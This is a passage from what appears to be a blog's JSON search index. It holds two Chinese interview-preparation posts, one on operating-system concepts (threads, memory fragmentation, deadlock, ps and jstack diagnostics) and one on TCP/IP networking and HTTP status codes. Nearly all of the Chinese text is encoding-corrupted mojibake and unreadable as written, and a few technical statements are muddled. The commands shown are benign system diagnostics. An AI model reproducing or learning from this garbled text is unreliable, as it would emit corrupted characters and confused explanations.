system","slug":"æ“ä½œç³»ç»Ÿæ¦‚è®º","date":"2020-07-23T22:46:46.000Z","updated":"2021-04-11T17:11:28.903Z","comments":true,"path":"æ“ä½œç³»ç»Ÿæ¦‚è®º/","link":"","permalink":"https://blog.kayleh.top/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/","excerpt":"æ“ä½œç³»ç»Ÿæ¦‚è®º","text":"æ“ä½œç³»ç»Ÿæ¦‚è®º 64ä½å’Œ32ä½çš„åŒºåˆ«ï¼Ÿæ“ä½œç³»ç»Ÿåªæ˜¯ç¡¬ä»¶å’Œåº”ç”¨è½¯ä»¶ä¸­é—´çš„ä¸€ä¸ªå¹³å°ã€‚32ä½æ“ä½œç³»ç»Ÿé’ˆå¯¹çš„32ä½çš„CPUè®¾è®¡ã€‚64ä½æ“ä½œç³»ç»Ÿé’ˆå¯¹çš„64ä½çš„CPUè®¾è®¡ã€‚ CentOS å’Œ Linuxçš„å…³ç³»ï¼ŸCentOSæ˜¯Linuxä¼—å¤šå¾—å‘è¡Œç‰ˆæœ¬ä¹‹ä¸€ï¼Œlinuxæœ‰ä¸‰å¤§å‘è¡Œç‰ˆæœ¬ï¼ˆï¼šSlackwareã€debianã€redhatï¼‰,è€ŒRedhatæœ‰æ”¶è´¹çš„å•†ä¸šç‰ˆå’Œå…è´¹çš„å¼€æºç‰ˆ,å•†ä¸šç‰ˆçš„ä¸šå†…ç§°ä¹‹ä¸ºRHELç³»åˆ—ï¼ŒCentOSæ˜¯æ¥è‡ªäºä¾ç…§å¼€æ”¾æºä»£ç è§„å®šè€Œå…¬å¸ƒçš„æºä»£ç é‡æ–°ç¼–è¯‘è€Œæˆã€‚å¯ä»¥ç”¨CentOSæ›¿ä»£å•†ä¸šç‰ˆçš„RHELä½¿ç”¨ã€‚ä¸¤è€…çš„ä¸åŒï¼ŒCentOSä¸åŒ…å«å°é—­æºä»£ç è½¯ä»¶ï¼Œæ˜¯å…è´¹çš„ã€‚ è¿›ç¨‹çš„æè¿°ä¸æ§åˆ¶LINUXä¸‹çš„çº¿ç¨‹ï¼ŒGDIç±»LINUXå®ç°çš„å°±æ˜¯åŸºäºæ ¸å¿ƒè½»é‡çº§è¿›ç¨‹çš„â€ä¸€å¯¹ä¸€â€çº¿ç¨‹æ¨¡å‹ï¼Œä¸€ä¸ªçº¿ç¨‹å®ä½“å¯¹åº”ä¸€ä¸ªæ ¸å¿ƒè½»é‡çº§è¿›ç¨‹ï¼Œè€Œçº¿ç¨‹ä¹‹é—´çš„ç®¡ç†åœ¨æ ¸å¤–å‡½æ•°åº“ä¸­å®ç°ã€‚ GDIç±»ä¸ºå›¾åƒè®¾å¤‡ç¼–ç¨‹æ¥å£ç±»åº“ã€‚ è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿè¿›ç¨‹æ˜¯æ‰§è¡Œç€çš„åº”ç”¨ç¨‹åºï¼Œè€Œçº¿ç¨‹æ˜¯è¿›ç¨‹å†…éƒ¨çš„ä¸€ä¸ªæ‰§è¡Œåºåˆ—ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ã€‚çº¿ç¨‹åˆå«åšè½»é‡çº§è¿›ç¨‹ã€‚ ç³»ç»Ÿçº¿ç¨‹æ•°é‡ä¸Šé™æ˜¯å¤šå°‘ï¼ŸLinux ç³»ç»Ÿä¸­å•ä¸ªè¿›ç¨‹çš„æœ€å¤§çº¿ç¨‹æ•°æœ‰å…¶æœ€å¤§çš„é™åˆ¶ PTHREAD_THREADS_MAXã€‚ è¿™ä¸ªé™åˆ¶å¯ä»¥åœ¨/usr/include/bits/local_lim.hä¸­æŸ¥çœ‹ ï¼Œå¯¹ linuxthreads è¿™ä¸ªå€¼ä¸€èˆ¬æ˜¯ 1024ï¼Œå¯¹äº nptl åˆ™æ²¡æœ‰ç¡¬æ€§çš„é™åˆ¶ï¼Œä»…ä»…å—é™äºç³»ç»Ÿçš„èµ„æºã€‚ è¿™ä¸ªç³»ç»Ÿçš„èµ„æºä¸»è¦å°±æ˜¯çº¿ç¨‹çš„ stack æ‰€å ç”¨çš„å†…å­˜ï¼Œç”¨ ulimit -s å¯ä»¥æŸ¥çœ‹é»˜è®¤çš„çº¿ç¨‹æ ˆå¤§å°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå€¼æ˜¯8M=8192KBã€‚ çº¿ç¨‹ä¸è¿›ç¨‹çš„åŒºåˆ«è¿›ç¨‹å’Œçº¿ç¨‹çš„ä¸»è¦å·®åˆ«åœ¨äºå®ƒä»¬æ˜¯ä¸åŒçš„æ“ä½œç³»ç»Ÿèµ„æºç®¡ç†æ–¹å¼ã€‚è¿›ç¨‹æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œä¸€ä¸ªè¿›ç¨‹å´©æºƒåï¼Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ä¸ä¼šå¯¹å…¶å®ƒè¿›ç¨‹äº§ç”Ÿå½±å“ï¼Œè€Œçº¿ç¨‹åªæ˜¯ä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒæ‰§è¡Œè·¯å¾„ã€‚çº¿ç¨‹æœ‰è‡ªå·±çš„å †æ ˆå’Œå±€éƒ¨å˜é‡ï¼Œä½†çº¿ç¨‹ä¹‹é—´æ²¡æœ‰å•ç‹¬çš„åœ°å€ç©ºé—´ï¼Œä¸€ä¸ªçº¿ç¨‹æ­»æ‰å°±ç­‰äºæ•´ä¸ªè¿›ç¨‹æ­»æ‰ï¼Œæ‰€ä»¥å¤šè¿›ç¨‹çš„ç¨‹åºè¦æ¯”å¤šçº¿ç¨‹çš„ç¨‹åºå¥å£®ï¼Œä½†åœ¨è¿›ç¨‹åˆ‡æ¢æ—¶ï¼Œè€—è´¹èµ„æºè¾ƒå¤§ï¼Œæ•ˆç‡è¦å·®ä¸€äº›ã€‚ä½†å¯¹äºä¸€äº›è¦æ±‚åŒæ—¶è¿›è¡Œå¹¶ä¸”åˆè¦å…±äº«æŸäº›å˜é‡çš„å¹¶å‘æ“ä½œï¼Œåªèƒ½ç”¨çº¿ç¨‹ï¼Œä¸èƒ½ç”¨è¿›ç¨‹ã€‚ 1) ç®€è€Œè¨€ä¹‹,ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹,ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹. 2) çº¿ç¨‹çš„åˆ’åˆ†å°ºåº¦å°äºè¿›ç¨‹ï¼Œä½¿å¾—å¤šçº¿ç¨‹ç¨‹åºçš„å¹¶å‘æ€§é«˜ã€‚ 3) å¦å¤–ï¼Œè¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å•å…ƒï¼Œè€Œå¤šä¸ªçº¿ç¨‹å…±äº«å†…å­˜ï¼Œä»è€Œæå¤§åœ°æé«˜äº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚ 4) çº¿ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸è¿›ç¨‹è¿˜æ˜¯æœ‰åŒºåˆ«çš„ã€‚æ¯ä¸ªç‹¬ç«‹çš„çº¿ç¨‹æœ‰ä¸€ä¸ªç¨‹åºè¿è¡Œçš„å…¥å£ã€é¡ºåºæ‰§è¡Œåºåˆ—å’Œç¨‹åºçš„å‡ºå£ã€‚ä½†æ˜¯çº¿ç¨‹ä¸èƒ½å¤Ÿç‹¬ç«‹æ‰§è¡Œï¼Œå¿…é¡»ä¾å­˜åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œç”±åº”ç”¨ç¨‹åºæä¾›å¤šä¸ªçº¿ç¨‹æ‰§è¡Œæ§åˆ¶ã€‚ 5) ä»é€»è¾‘è§’åº¦æ¥çœ‹ï¼Œå¤šçº¿ç¨‹çš„æ„ä¹‰åœ¨äºä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œæœ‰å¤šä¸ªæ‰§è¡Œéƒ¨åˆ†å¯ä»¥åŒæ—¶æ‰§è¡Œã€‚ä½†æ“ä½œç³»ç»Ÿå¹¶æ²¡æœ‰å°†å¤šä¸ªçº¿ç¨‹çœ‹åšå¤šä¸ªç‹¬ç«‹çš„åº”ç”¨ï¼Œæ¥å®ç°è¿›ç¨‹çš„è°ƒåº¦å’Œç®¡ç†ä»¥åŠèµ„æºåˆ†é…ã€‚è¿™å°±æ˜¯è¿›ç¨‹å’Œçº¿ç¨‹çš„é‡è¦åŒºåˆ«ã€‚ å¦‚ä½•æ€æ­»ä¸€ä¸ªè¿›ç¨‹ï¼ŸKill pid è¾“å…¥è¾“å‡ºç³»ç»Ÿè¯·ä»‹ç»ä¸€ä¸‹ï¼Œsocketç¼–ç¨‹çš„ä¸‰ç§é€šä¿¡æ¨¡å‹ï¼ŒBIOï¼ŒNIOï¼ŒAIOé˜»å¡ï¼Œéé˜»å¡ï¼Œioå¤šè·¯å¤ç”¨ï¼Œepollæ”¯æŒæ–‡ä»¶ç¬¦æ•°ç›®æ²¡æœ‰é™åˆ¶ï¼Œfdé›†åˆåªä¼šä»ç”¨æˆ·è¿›ç¨‹æ‹·è´åˆ°å†…æ ¸ä¸€æ¬¡ï¼Œè‡ªå·±ç»´æŠ¤ä¸€ä¸ªäº‹ä»¶é˜Ÿåˆ—ï¼Œä¸ç”¨æ¯æ¬¡éå†fdé›†åˆå‘ç°æ˜¯å¦æœ‰å°±ç»ªçŠ¶æ€ã€‚ å­˜å‚¨å™¨ç®¡ç†æ€ä¹ˆç†è§£æ“ä½œç³»ç»Ÿé‡Œçš„å†…å­˜ç¢ç‰‡ï¼Œæœ‰ä»€ä¹ˆè§£å†³åŠæ³•ï¼Ÿå†…å­˜ç¢ç‰‡åˆ†ä¸ºï¼šå†…éƒ¨ç¢ç‰‡å’Œå¤–éƒ¨ç¢ç‰‡ã€‚ å†…éƒ¨ç¢ç‰‡å°±æ˜¯å·²ç»è¢«åˆ†é…å‡ºå»ï¼ˆèƒ½æ˜ç¡®æŒ‡å‡ºå±äºå“ªä¸ªè¿›ç¨‹ï¼‰å´ä¸èƒ½è¢«åˆ©ç”¨çš„å†…å­˜ç©ºé—´ï¼› å†…éƒ¨ç¢ç‰‡æ˜¯å¤„äºåŒºåŸŸå†…éƒ¨æˆ–é¡µé¢å†…éƒ¨çš„å­˜å‚¨å—ã€‚å æœ‰è¿™äº›åŒºåŸŸæˆ–é¡µé¢çš„è¿›ç¨‹å¹¶ä¸ä½¿ç”¨è¿™ä¸ªå­˜å‚¨å—ã€‚è€Œåœ¨è¿›ç¨‹å æœ‰è¿™å—å­˜å‚¨å—æ—¶ï¼Œç³»ç»Ÿæ— æ³•åˆ©ç”¨å®ƒã€‚ç›´åˆ°è¿›ç¨‹é‡Šæ”¾å®ƒï¼Œæˆ–è¿›ç¨‹ç»“æŸæ—¶ï¼Œç³»ç»Ÿæ‰æœ‰å¯èƒ½åˆ©ç”¨è¿™ä¸ªå­˜å‚¨å—ã€‚ å•é“è¿ç»­åˆ†é…åªæœ‰å†…éƒ¨ç¢ç‰‡ã€‚å¤šé“å›ºå®šè¿ç»­åˆ†é…æ—¢æœ‰å†…éƒ¨ç¢ç‰‡ï¼Œåˆæœ‰å¤–éƒ¨ç¢ç‰‡ã€‚ å¤–éƒ¨ç¢ç‰‡æŒ‡çš„æ˜¯è¿˜æ²¡æœ‰è¢«åˆ†é…å‡ºå»ï¼ˆä¸å±äºä»»ä½•è¿›ç¨‹ï¼‰ï¼Œä½†ç”±äºå¤ªå°äº†æ— æ³•åˆ†é…ç»™ç”³è¯·å†…å­˜ç©ºé—´çš„æ–°è¿›ç¨‹çš„å†…å­˜ç©ºé—²åŒºåŸŸã€‚ å¤–éƒ¨ç¢ç‰‡æ˜¯å‡ºäºä»»ä½•å·²åˆ†é…åŒºåŸŸæˆ–é¡µé¢å¤–éƒ¨çš„ç©ºé—²å­˜å‚¨å—ã€‚è¿™äº›å­˜å‚¨å—çš„æ€»å’Œå¯ä»¥æ»¡è¶³å½“å‰ç”³è¯·çš„é•¿åº¦è¦æ±‚ï¼Œä½†æ˜¯ç”±äºå®ƒä»¬çš„åœ°å€ä¸è¿ç»­æˆ–å…¶ä»–åŸå› ï¼Œä½¿å¾—ç³»ç»Ÿæ— æ³•æ»¡è¶³å½“å‰ç”³è¯·ã€‚ ä½¿ç”¨ä¼™ä¼´ç³»ç»Ÿç®—æ³•ã€‚ ä»€ä¹ˆæ˜¯é¡µå¼å­˜å‚¨ï¼Ÿä¸»å­˜è¢«ç­‰åˆ†æˆå¤§å°ç›¸ç­‰çš„ç‰‡ï¼Œç§°ä¸ºä¸»å­˜å—ï¼Œåˆç§°ä¸ºå®é¡µã€‚ å½“ä¸€ä¸ªç”¨æˆ·ç¨‹åºè£…å…¥å†…å­˜æ—¶ï¼Œä»¥é¡µé¢ä¸ºå•ä½è¿›è¡Œåˆ†é…ã€‚é¡µé¢çš„å¤§å°æ˜¯ä¸º2n ,é€šå¸¸ä¸º1KBã€2KBã€2n KBç­‰ å¤„ç†è°ƒåº¦ä¸æ­»é”ç³»ç»Ÿå¦‚ä½•æé«˜å¹¶å‘æ€§ï¼Ÿ1ã€æé«˜CPUå¹¶å‘è®¡ç®—èƒ½åŠ› ï¼ˆ1ï¼‰å¤šè¿›ç¨‹&amp;å¤šçº¿ç¨‹ ï¼ˆ2ï¼‰å‡å°‘è¿›ç¨‹åˆ‡æ¢ï¼Œä½¿ç”¨çº¿ç¨‹ï¼Œè€ƒè™‘è¿›ç¨‹ç»‘å®šCPU ï¼ˆ3ï¼‰å‡å°‘ä½¿ç”¨ä¸å¿…è¦çš„é”ï¼Œè€ƒè™‘æ— é”ç¼–ç¨‹ ï¼ˆ4ï¼‰è€ƒè™‘è¿›ç¨‹ä¼˜å…ˆçº§ ï¼ˆ5ï¼‰å…³æ³¨ç³»ç»Ÿè´Ÿè½½ 2ã€æ”¹è¿›I/Oæ¨¡å‹ (1)DMAæŠ€æœ¯ (2)å¼‚æ­¥I/O (3)æ”¹è¿›å¤šè·¯I/Oå°±ç»ªé€šçŸ¥ç­–ç•¥ï¼Œepoll (4)Sendfile (5)å†…å­˜æ˜ å°„ (6)ç›´æ¥I/O é€šå¸¸ç³»ç»ŸCPUæ¯”è¾ƒé«˜æ˜¯ä»€ä¹ˆåŸå› ï¼Ÿ1ã€é¦–å…ˆæŸ¥çœ‹æ˜¯å“ªäº›è¿›ç¨‹çš„CPUå ç”¨ç‡æœ€é«˜ï¼ˆå¦‚ä¸‹å¯ä»¥çœ‹åˆ°è¯¦ç»†çš„è·¯å¾„ï¼‰ ps -aux â€”sort -pcpu | more # å®šä½æœ‰é—®é¢˜çš„çº¿ç¨‹å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ ps -mp pid -o THREAD,tid,time | more 2ã€æŸ¥çœ‹JAVAè¿›ç¨‹çš„æ¯ä¸ªçº¿ç¨‹çš„CPUå ç”¨ç‡ ps -Lp 5798 cu | more # 5798æ˜¯æŸ¥å‡ºæ¥è¿›ç¨‹PID 3ã€è¿½è¸ªçº¿ç¨‹ï¼ŒæŸ¥çœ‹è´Ÿè½½è¿‡é«˜çš„åŸå› ï¼Œä½¿ç”¨JDKä¸‹çš„ä¸€ä¸ªå·¥å…· jstack 5798 # 5798æ˜¯PID jstack -J-d64 -m 5798 # -j-d64æŒ‡å®š64ä¸ºç³»ç»Ÿ jstack æŸ¥å‡ºæ¥çš„çº¿ç¨‹IDæ˜¯16è¿›åˆ¶ï¼Œå¯ä»¥æŠŠè¾“å‡ºè¿½åŠ åˆ°æ–‡ä»¶ï¼Œå¯¼å‡ºç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå†æ ¹æ®ç³»ç»Ÿä¸­çš„çº¿ç¨‹IDå»æœç´¢æŸ¥çœ‹è¯¥IDçš„çº¿ç¨‹è¿è¡Œå†…å®¹ï¼Œå¯ä»¥å’Œå¼€å‘ä¸€èµ·æ’æŸ¥ã€‚ ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‘ç”Ÿæ­»é”ï¼Ÿè§£å†³æ­»é”çš„ç­–ç•¥æœ‰å“ªäº›ï¼Ÿï¼ˆä¸€ï¼‰äº’æ–¥æ¡ä»¶ï¼šä¸€ä¸ªèµ„æºä¸€æ¬¡åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹è®¿é—®ã€‚å³æŸä¸ªèµ„æºåœ¨ä¸€æ®µæ—¶é—´å†…åªèƒ½ç”±ä¸€ä¸ªè¿›ç¨‹å æœ‰ï¼Œä¸èƒ½åŒæ—¶è¢«ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹å  æœ‰ã€‚è¿™ç§ç‹¬å èµ„æºå¦‚CD-ROMé©±åŠ¨å™¨ï¼Œæ‰“å°æœºç­‰ç­‰ï¼Œå¿…é¡»åœ¨å æœ‰è¯¥èµ„æºçš„è¿›ç¨‹ä¸»åŠ¨é‡Šæ”¾å®ƒä¹‹åï¼Œå…¶å®ƒè¿›ç¨‹æ‰èƒ½å æœ‰è¯¥èµ„æºã€‚è¿™æ˜¯ç”±èµ„æºæœ¬èº«çš„å±æ€§æ‰€å†³å®šçš„ã€‚ ï¼ˆäºŒï¼‰è¯·æ±‚ä¸ä¿æŒæ¡ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹å› è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œå¯¹å·²è·å¾—çš„èµ„æºä¿æŒä¸æ”¾ã€‚è¿›ç¨‹è‡³å°‘å·²ç»å æœ‰ä¸€ä¸ªèµ„æºï¼Œä½†åˆç”³è¯·æ–°çš„èµ„æºï¼›ç”±äºè¯¥èµ„æºå·²è¢«å¦å¤–è¿›ç¨‹å æœ‰ï¼Œæ­¤æ—¶è¯¥è¿›ç¨‹é˜»å¡ï¼›ä½†æ˜¯ï¼Œå®ƒåœ¨ç­‰å¾…æ–°èµ„æºä¹‹æ—¶ï¼Œä»ç»§ç»­å ç”¨å·²å æœ‰çš„èµ„æºã€‚ ï¼ˆä¸‰ï¼‰ä¸å‰¥å¤ºæ¡ä»¶ï¼šè¿›ç¨‹å·²ç»è·å¾—çš„èµ„æºï¼Œåœ¨æœªä½¿ç”¨å®Œä¹‹å‰ä¸èƒ½å¼ºè¡Œå‰¥å¤ºï¼Œè€Œåªèƒ½ç”±è¯¥èµ„æºçš„å æœ‰è€…è¿›ç¨‹è‡ªè¡Œé‡Šæ”¾ã€‚ ï¼ˆå››ï¼‰å¾ªç¯ç­‰å¾…æ¡ä»¶ï¼šè‹¥å¹²èµ„æºå½¢æˆä¸€ç§å¤´å°¾ç›¸æ¥çš„å¾ªç¯ç­‰å¾…èµ„æºå…³ç³»ã€‚ è§£å†³æ–¹æ³•ï¼šé“¶è¡Œå®¶ç®—æ³•","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","date":"2020-07-23T22:30:23.000Z","updated":"2021-04-11T17:11:29.036Z","comments":true,"path":"è®¡ç®—æœºç½‘ç»œ/","link":"","permalink":"https://blog.kayleh.top/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","excerpt":"è®¡ç®—æœºç½‘ç»œ","text":"è®¡ç®—æœºç½‘ç»œ TCPåè®®ã€IPåè®®ã€HTTPåè®®åˆ†åˆ«åœ¨å“ªä¸€å±‚å—ï¼Ÿè¿è¾“å±‚ï¼Œç½‘ç»œå±‚ï¼Œåº”ç”¨å±‚ã€‚ ç½‘ç»œä¸ƒå±‚æ¨¡å‹ï¼š ç‰©ç†å±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç½‘ç»œå±‚ï¼Œè¿è¾“å±‚ï¼Œä¼šè¯å±‚ï¼Œè¡¨ç°å±‚ï¼Œåº”ç”¨å±‚ ç½‘ç»œäº”å±‚æ¨¡å‹ï¼š ç‰©ç†å±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç½‘ç»œå±‚ï¼Œè¿è¾“å±‚ï¼Œåº”ç”¨å±‚ è¿è¾“å±‚TCPåè®®çš„4æ¬¡æ¡æ‰‹ã€‚ç”±äºTCPè¿æ¥æ˜¯å…¨åŒå·¥çš„ï¼Œå› æ­¤æ¯ä¸ªæ–¹å‘éƒ½å¿…é¡»å•ç‹¬è¿›è¡Œå…³é—­ã€‚è¿™ä¸ªåŸåˆ™æ˜¯å½“ä¸€æ–¹å®Œæˆå®ƒçš„æ•°æ®å‘é€ä»»åŠ¡åå°±èƒ½å‘é€ä¸€ä¸ªFINæ¥ç»ˆæ­¢è¿™ä¸ªæ–¹å‘çš„è¿æ¥ã€‚æ”¶åˆ°ä¸€ä¸ª FINåªæ„å‘³ç€è¿™ä¸€æ–¹å‘ä¸Šæ²¡æœ‰æ•°æ®æµåŠ¨ï¼Œä¸€ä¸ªTCPè¿æ¥åœ¨æ”¶åˆ°ä¸€ä¸ªFINåä»èƒ½å‘é€æ•°æ®ã€‚é¦–å…ˆè¿›è¡Œå…³é—­çš„ä¸€æ–¹å°†æ‰§è¡Œä¸»åŠ¨å…³é—­ï¼Œè€Œå¦ä¸€æ–¹æ‰§è¡Œè¢«åŠ¨å…³é—­ã€‚ TCPçš„è¿æ¥çš„æ‹†é™¤éœ€è¦å‘é€å››ä¸ªåŒ…ï¼Œå› æ­¤ç§°ä¸ºå››æ¬¡æŒ¥æ‰‹(four-way handshake)ã€‚å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å‡å¯ä¸»åŠ¨å‘èµ·æŒ¥æ‰‹åŠ¨ä½œï¼Œåœ¨socketç¼–ç¨‹ä¸­ï¼Œä»»ä½•ä¸€æ–¹æ‰§è¡Œclose()æ“ä½œå³å¯äº§ç”ŸæŒ¥æ‰‹æ“ä½œã€‚ ï¼ˆ1ï¼‰å®¢æˆ·ç«¯Aå‘é€ä¸€ä¸ªFINï¼Œç”¨æ¥å…³é—­å®¢æˆ·Aåˆ°æœåŠ¡å™¨Bçš„æ•°æ®ä¼ é€ã€‚ ï¼ˆ2ï¼‰æœåŠ¡å™¨Bæ”¶åˆ°è¿™ä¸ªFINï¼Œå®ƒå‘å›ä¸€ä¸ªACKï¼Œç¡®è®¤åºå·ä¸ºæ”¶åˆ°çš„åºå·åŠ 1ã€‚å’ŒSYNä¸€æ ·ï¼Œä¸€ä¸ªFINå°†å ç”¨ä¸€ä¸ªåºå·ã€‚ ï¼ˆ3ï¼‰æœåŠ¡å™¨Bå…³é—­ä¸å®¢æˆ·ç«¯Açš„è¿æ¥ï¼Œå‘é€ä¸€ä¸ªFINç»™å®¢æˆ·ç«¯Aã€‚ ï¼ˆ4ï¼‰å®¢æˆ·ç«¯Aå‘å›ACKæŠ¥æ–‡ç¡®è®¤ï¼Œå¹¶å°†ç¡®è®¤åºå·è®¾ç½®ä¸ºæ”¶åˆ°åºå·åŠ 1ã€‚ ä¸ºä»€ä¹ˆtcpä¸ºä»€ä¹ˆè¦å»ºç«‹è¿æ¥ï¼Ÿä¿è¯å¯é ä¼ è¾“ã€‚ è§£é‡Šä¸€ä¸‹TCPä¸ºä»€ä¹ˆå¯é ä¸€äº› ä¸‰æ¬¡æ¡æ‰‹ï¼Œè¶…æ—¶é‡ä¼ ï¼Œæ»‘åŠ¨çª—å£ï¼Œæ‹¥å¡æ§åˆ¶ã€‚ è¯´æ˜ä¸€ä¸‹å“ªç§åº”ç”¨åœºæ™¯ä¼šä½¿ç”¨TCPåè®®ï¼Œä½¿ç”¨å®ƒçš„æ„ä¹‰ å½“å¯¹ç½‘ç»œé€šè®¯è´¨é‡æœ‰è¦æ±‚çš„æ—¶å€™ï¼Œæ¯”å¦‚ï¼šæ•´ä¸ªæ•°æ®è¦å‡†ç¡®æ— è¯¯çš„ä¼ é€’ç»™å¯¹æ–¹ï¼Œè¿™å¾€å¾€ç”¨äºä¸€äº›è¦æ±‚å¯é çš„åº”ç”¨ï¼Œæ¯”å¦‚HTTPã€HTTPSã€FTPç­‰ä¼ è¾“æ–‡ä»¶çš„åè®®ï¼ŒPOPã€SMTPç­‰é‚®ä»¶ä¼ è¾“çš„åè®® ç®€å•æè¿°ä¸€ä¸‹ï¼ŒTCPçš„è¿æ¥å’Œé‡Šæ”¾è¿‡ç¨‹ã€‚ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹1ï¼‰ä¸»æœºAå‘ä¸»æœºBå‘é€TCPè¿æ¥è¯·æ±‚æ•°æ®åŒ…ï¼Œå…¶ä¸­åŒ…å«ä¸»æœºAçš„åˆå§‹åºåˆ—å·seq(A)=xã€‚ï¼ˆå…¶ä¸­æŠ¥æ–‡ä¸­åŒæ­¥æ ‡å¿—ä½SYN=1ï¼ŒACK=0ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªTCPè¿æ¥è¯·æ±‚æ•°æ®æŠ¥æ–‡ï¼›åºå·seq=xï¼Œè¡¨æ˜ä¼ è¾“æ•°æ®æ—¶çš„ç¬¬ä¸€ä¸ªæ•°æ®å­—èŠ‚çš„åºå·æ˜¯xï¼‰ï¼› 2ï¼‰ä¸»æœºBæ”¶åˆ°è¯·æ±‚åï¼Œä¼šå‘å›è¿æ¥ç¡®è®¤æ•°æ®åŒ…ã€‚ï¼ˆå…¶ä¸­ç¡®è®¤æŠ¥æ–‡æ®µä¸­ï¼Œæ ‡è¯†ä½SYN=1ï¼ŒACK=1ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªTCPè¿æ¥å“åº”æ•°æ®æŠ¥æ–‡ï¼Œå¹¶å«ä¸»æœºBçš„åˆå§‹åºåˆ—å·seq(B)=yï¼Œä»¥åŠä¸»æœºBå¯¹ä¸»æœºAåˆå§‹åºåˆ—å·çš„ç¡®è®¤å·ack(B)=seq(A)+1=x+1ï¼‰ 3ï¼‰ç¬¬ä¸‰æ¬¡ï¼Œä¸»æœºAæ”¶åˆ°ä¸»æœºBçš„ç¡®è®¤æŠ¥æ–‡åï¼Œè¿˜éœ€ä½œå‡ºç¡®è®¤ï¼Œå³å‘é€ä¸€ä¸ªåºåˆ—å·seq(A)=x+1ï¼›ç¡®è®¤å·ä¸ºack(A)=y+1çš„æŠ¥æ–‡ï¼› å››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹å‡è®¾ä¸»æœºAä¸ºå®¢æˆ·ç«¯ï¼Œä¸»æœºBä¸ºæœåŠ¡å™¨ï¼Œå…¶é‡Šæ”¾TCPè¿æ¥çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š1ï¼‰ å…³é—­å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„è¿æ¥ï¼šé¦–å…ˆå®¢æˆ·ç«¯Aå‘é€ä¸€ä¸ªFINï¼Œç”¨æ¥å…³é—­å®¢æˆ·åˆ°æœåŠ¡å™¨çš„æ•°æ®ä¼ é€ï¼Œç„¶åç­‰å¾…æœåŠ¡å™¨çš„ç¡®è®¤ã€‚å…¶ä¸­ç»ˆæ­¢æ ‡å¿—ä½FIN=1ï¼Œåºåˆ—å·seq=uã€‚2ï¼‰ æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªFINï¼Œå®ƒå‘å›ä¸€ä¸ªACKï¼Œç¡®è®¤å·ackä¸ºæ”¶åˆ°çš„åºå·åŠ 1ã€‚3ï¼‰ å…³é—­æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„è¿æ¥ï¼šä¹Ÿæ˜¯å‘é€ä¸€ä¸ªFINç»™å®¢æˆ·ç«¯ã€‚ 4ï¼‰ å®¢æˆ·æ®µæ”¶åˆ°FINåï¼Œå¹¶å‘å›ä¸€ä¸ªACKæŠ¥æ–‡ç¡®è®¤ï¼Œå¹¶å°†ç¡®è®¤åºå·seqè®¾ç½®ä¸ºæ”¶åˆ°åºå·åŠ 1ã€‚ é¦–å…ˆè¿›è¡Œå…³é—­çš„ä¸€æ–¹å°†æ‰§è¡Œä¸»åŠ¨å…³é—­ï¼Œè€Œå¦ä¸€æ–¹æ‰§è¡Œè¢«åŠ¨å…³é—­ã€‚ ä¸‰æ¬¡æ¡æ‰‹ å››æ¬¡æŒ¥æ‰‹ httpè¯·æ±‚ä¸­çš„304çŠ¶æ€ç çš„å«ä¹‰304(æœªä¿®æ”¹)è‡ªä»ä¸Šæ¬¡è¯·æ±‚åï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡ã€‚æœåŠ¡å™¨è¿”å›æ­¤å“åº”æ—¶ï¼Œä¸ä¼šè¿”å›ç½‘é¡µå†…å®¹ã€‚å¦‚æœç½‘é¡µè‡ªè¯·æ±‚è€…ä¸Šæ¬¡è¯·æ±‚åå†ä¹Ÿæ²¡æœ‰æ›´æ”¹è¿‡ï¼Œæ‚¨åº”å°†æœåŠ¡å™¨é…ç½®ä¸ºè¿”å›æ­¤å“åº”(ç§°ä¸º If-Modified-Since HTTP æ ‡å¤´)ã€‚æœåŠ¡å™¨å¯ä»¥å‘Šè¯‰ Googlebot è‡ªä»ä¸Šæ¬¡æŠ“å–åç½‘é¡µæ²¡æœ‰å˜æ›´ï¼Œè¿›è€ŒèŠ‚çœå¸¦å®½å’Œå¼€é”€ã€‚ 